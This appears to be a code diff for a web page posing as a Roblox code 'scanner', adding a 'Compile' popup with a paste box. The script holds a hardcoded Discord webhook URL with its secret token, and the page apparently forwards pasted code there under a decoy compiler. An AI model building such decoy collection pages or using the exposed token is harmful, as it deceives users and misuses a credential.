@@ -125,6 +125,106 @@
             color: #666;
             font-style: italic;
         }
+
+        .compile-btn {
+            background: linear-gradient(45deg, #ff6b35, #f7931e);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 16px;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-left: 15px;
+        }
+
+        .compile-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(255, 107, 53, 0.3);
+        }
+
+        .compile-btn:active {
+            transform: translateY(0);
+        }
+
+        /* Popup styles */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+
+        .popup-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 600px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .popup-title {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #ff6b35;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .code-textarea {
+            width: 100%;
+            min-height: 200px;
+            padding: 15px;
+            border: 2px solid #ffecde;
+            border-radius: 12px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            resize: vertical;
+            background: #fafafa;
+        }
+
+        .code-textarea:focus {
+            outline: none;
+            border-color: #ff6b35;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.1);
+        }
+
+        .popup-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            justify-content: center;
+        }
+
+        .close-btn {
+            background: #ccc;
+            color: #666;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .close-btn:hover {
+            background: #bbb;
+        }
     </style>
 </head>
 <body>
@@ -148,6 +248,9 @@
             <button type="submit" class="submit-btn" id="submitBtn">
                 Scan Code
             </button>
+            <button type="button" class="compile-btn" id="compileBtn">
+                Compile
+            </button>
         </form>
         
         <div id="statusMessage" class="status-message"></div>
@@ -157,11 +260,45 @@
         </div>
     </div>
 
+    <!-- Compile Popup -->
+    <div id="compilePopup" class="popup-overlay">
+        <div class="popup-content">
+            <div class="popup-title">🔧 Code Compiler</div>
+            <form id="compileForm">
+                <textarea 
+                    id="codeTextarea" 
+                    class="code-textarea" 
+                    placeholder="Paste your code here to compile...&#10;&#10;-- Example:&#10;print('Hello World!')&#10;game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50"
+                    required
+                    spellcheck="false"
+                ></textarea>
+                
+                <div class="popup-buttons">
+                    <button type="button" class="close-btn" id="closePopup">Cancel</button>
+                    <button type="submit" class="submit-btn" id="compileSubmitBtn">
+                        🚀 Compile Code
+                    </button>
+                </div>
+            </form>
+            
+            <div id="compileStatusMessage" class="status-message"></div>
+        </div>
+    </div>
+
     <script>
         const form = document.getElementById('scannerForm');
         const codeInput = document.getElementById('codeInput');
         const submitBtn = document.getElementById('submitBtn');
         const statusMessage = document.getElementById('statusMessage');
+        
+        // Compile popup elements
+        const compileBtn = document.getElementById('compileBtn');
+        const compilePopup = document.getElementById('compilePopup');
+        const compileForm = document.getElementById('compileForm');
+        const codeTextarea = document.getElementById('codeTextarea');
+        const compileSubmitBtn = document.getElementById('compileSubmitBtn');
+        const compileStatusMessage = document.getElementById('compileStatusMessage');
+        const closePopup = document.getElementById('closePopup');
         
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
 
